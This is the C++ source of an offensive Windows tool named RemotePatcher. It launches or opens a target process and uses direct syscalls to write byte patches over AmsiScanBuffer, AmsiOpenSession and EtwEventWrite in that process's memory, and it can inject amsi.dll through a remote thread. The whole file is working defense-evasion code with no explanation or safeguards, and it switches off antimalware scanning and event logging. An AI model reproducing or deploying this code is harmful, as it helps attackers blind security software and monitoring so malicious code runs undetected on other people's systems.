#include <Windows.h>
#include <psapi.h>
#include <iostream>
#include <tchar.h>
#include "syscalls_mem.h"


void patchAMSI(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
 
    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;

    
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi!\n";
}

void patchAMSIOpenSession(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");

    char amsiPatch[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi open session!\n";
}

void patchETW(OUT HANDLE& hProc) {

    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
    
    char etwPatch[] = { 0xC3 };
    
    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched etw!\n";

}

void loadAMSIdll(OUT HANDLE& hProc) {

    PVOID buf;
    const char* dllPath;
    dllPath = "C:\\Windows\\System32\\amsi.dll";
   
    
    LPVOID lpAllocationStart = nullptr;
    HANDLE dllThread = NULL;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, (PSIZE_T)&szAllocationSize, MEM_COMMIT, PAGE_READWRITE);
    NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, hProc, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
    
    if (dllThread == NULL) {
        std::cout << "[-] Failed to load amsi.dll\n";
    }
    else {
        WaitForSingleObject(dllThread, 1000);
    }

    
}

void printHelp() {
    std::cout <<
        "RemotePatcher\n"
        "More info: https://github.com/Hagrid29/RemotePatcher/\n";
    std::cout <<
        "Options:\n"
        "  --exe \"[cmd]\""
        "\tthe program that will be executed and patched\n"
        "  --pid [pid]"
        "\tthe process ID that will be patched\n"
        "  -na"
        "\t\tto NOT patch AMSI\n"
        "  -ne"
        "\t\tto NOT patch ETW\n"
        "  -ao"
        "\t\tto patch AmsiOpenSession instead of AmsiScanBuffer\n"
        "  -l"
        "\t\tto load amsi.dll\n"
        << std::endl;
    return;
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printHelp();
        return 0;
    }

    char* mode;
    bool isPatchAMSI = true;
    bool isPatchAMSIOpenSession = false;
    bool isPatchETW = true;
    bool isLoadDll = false;
    LPSTR cmd;
    HANDLE hProc = NULL;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-h") {
            printHelp();
            return 0;
        }
        else if (arg == "--exe") {
            LPSTARTUPINFOA si = new STARTUPINFOA();
            LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            CreateProcessA(
                NULL,
                (LPSTR)argv[i+1],
                NULL,
                NULL,
                TRUE,
                0,
                NULL,
                NULL,
                si,
                pi
            );
            hProc = pi->hProcess;
        }
        else if (arg == "--pid") {
            hProc = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                FALSE,
                (DWORD)atoi(argv[i+1])
            );
           
        }
        else if(arg == "-na"){
            isPatchAMSI = false;
        }
        else if (arg == "-ne") {
            isPatchETW = false;
        }
        else if (arg == "-ao") {
            isPatchAMSI = false;
            isPatchAMSIOpenSession = true;
        }
        else if (arg == "-l") {
            isLoadDll = true;
        }

    }

    if (hProc == NULL) {
        std::cout << "[-] Failed to open target process\n";
        printHelp();
        return 0;
    }

    if (isLoadDll)
        loadAMSIdll(hProc);

    if (isPatchETW)
        patchETW(hProc);

    if (isPatchAMSI)
        patchAMSI(hProc);

    if (isPatchAMSIOpenSession)
        patchAMSIOpenSession(hProc);


    CloseHandle(hProc);
    return 0;
}